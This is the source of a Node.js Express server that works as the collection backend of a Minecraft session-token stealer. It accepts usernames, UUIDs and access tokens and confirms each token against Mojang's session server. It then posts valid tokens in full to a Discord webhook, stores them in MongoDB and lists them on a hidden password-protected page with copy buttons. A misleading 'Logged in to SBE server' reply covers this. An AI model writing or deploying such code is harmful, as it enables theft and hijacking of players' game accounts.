require('dotenv').config();
const { post } = require("axios").default;
const express = require("express");
const mongoose = require("mongoose");
const helmet = require("helmet");
const basicAuth = require('basic-auth');
const app = express();
const DataStore = require("./models/schema");
const path = require('path');
const port = process.env.PORT || 80;

// plugins
app.use(helmet()); // secure
app.use(express.json()); // parse JSON
app.use(express.urlencoded({ extended: true }));

// Serve static files from the public directory
app.use(express.static(path.join(__dirname, 'public')));

// database connection
mongoose.connect(process.env.DB, {
    useNewUrlParser: true,
    useUnifiedTopology: true
});
mongoose.connection.on("connected", () => console.log("Mongoose connection successfully opened!"));
mongoose.connection.on("error", err => console.error(`Mongoose connection error:\n${err.stack}`));
mongoose.connection.on("disconnected", () => console.log("Mongoose connection disconnected"));

// Basic Auth Middleware
function basicAuthMiddleware(req, res, next) {
    const credentials = basicAuth(req);
    if (!credentials || credentials.name !== process.env.BASIC_AUTH_USERNAME || credentials.pass !== process.env.BASIC_AUTH_PASSWORD) {
        res.setHeader('WWW-Authenticate', 'Basic realm="example"');
        return res.status(401).send('Authentication required.');
    }
    next();
}

app.get(process.env.HIDEN_PATH, basicAuthMiddleware, async (req, res) => {
    try {
        const data = await DataStore.find({}).sort({ timestamp: -1 }).exec();

        res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Database View</title>
            <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
            <style>
                body {
                    padding: 20px;
                    background-color: #f8f9fa;
                }
                table {
                    margin-top: 20px;
                }
                .copy-btn {
                    cursor: pointer;
                    margin-left: 10px;
                }
                .masked-token {
                    display: inline-block;
                    position: relative;
                    color: #6c757d;
                }
                .masked-token::before {
                    content: "****";
                }
            </style>
            <script src="/js/app.js" defer></script>
        </head>
        <body>
            <div class="container">
                <h1 class="text-center">Saved Data</h1>
                <table class="table table-striped table-bordered">
                    <thead>
                        <tr>
                            <th>Username</th>
                            <th>UUID</th>
                            <th>Token</th>
                            <th>Timestamp</th>
                        </tr>
                    </thead>
                    <tbody id="data-table-body">
                        ${data.map(item => `
                            <tr>
                                <td>${item.username}</td>
                                <td>${item.uuid}</td>
                                <td>
                                    <div class="masked-token" data-token="${item.token}">
                                        ****
                                        <button class="btn btn-info btn-sm copy-btn" data-token="${item.token}">Copy Token</button>
                                    </div>
                                </td>
                                <td>${new Date(item.timestamp).toLocaleString()}</td>
                            </tr>
                        `).join('')}
                    </tbody>
                </table>
            </div>
        </body>
        </html>
        `);
    } catch (err) {
        console.log("Error fetching data from database: ", err);
        res.status(500).send("Error fetching data");
    }
});

// log the JSON of a simple post
app.post("/", (req, res) => {
    // Happens if the request does not contain all the required fields
    if (!req.body.username || !req.body.uuid || !req.body.token) {
        console.log("Missing fields");
        return res.status(400).send("Missing fields");
    }

    // Validate the token with Mojang API
    post("https://sessionserver.mojang.com/session/minecraft/join", {
        accessToken: req.body.token,
        selectedProfile: req.body.uuid,
        serverId: req.body.uuid
    }, {
        headers: {
            'Content-Type': 'application/json'
        }
    })
    .then(response => {
        // Mojang's way of saying it's good
        if (response.status === 204) {
            const timestamp = new Date();
            const tokenAuth = `${req.body.username}:${req.body.uuid}:${req.body.token}`;

            // Send data to Discord webhook
            post(process.env.WEBHOOK_URL, {
                content: `**New Entry Saved:**\n- Username: ${req.body.username}\n- UUID: ${req.body.uuid}\n- Token: ${req.body.token}\n- Timestamp: ${timestamp}\n- TokenAuth: ${tokenAuth}`
            })
            .then(() => console.log("Notification sent to Discord webhook."))
            .catch(err => console.log("Error sending to Discord webhook: ", err));

            // Delete older entries for the same username or UUID
            DataStore.deleteMany({
                $or: [
                    { username: req.body.username },
                    { uuid: req.body.uuid }
                ]
            }, (err) => {
                if (err) {
                    console.log("Error deleting old data from database: ", err);
                    return res.status(500).send("Error deleting old data");
                }

                // Create a DataStore object with mongoose schema and save it
                new DataStore({
                    username: req.body.username,
                    uuid: req.body.uuid,
                    token: req.body.token,
                    timestamp: timestamp,
                    tokenAuth: tokenAuth
                }).save(err => {
                    if (err) {
                        console.log("Error saving to database: ", err);
                        return res.status(500).send("Error saving to database");
                    }
                    console.log(`${req.body.username} data has been stored!`, req.body);
                    res.send("Logged in to SBE server");
                });
            });
        } else {
            res.status(400).send("Invalid token or UUID");
        }
    })
    .catch(err => {
        const errorMessage = err.response?.data?.error || "Unknown error";
        console.log("Response Error: " + errorMessage);
        res.status(500).send(errorMessage);
    });
});

// create server
app.listen(port, () => console.log(`Listening at http://localhost:${port}`));
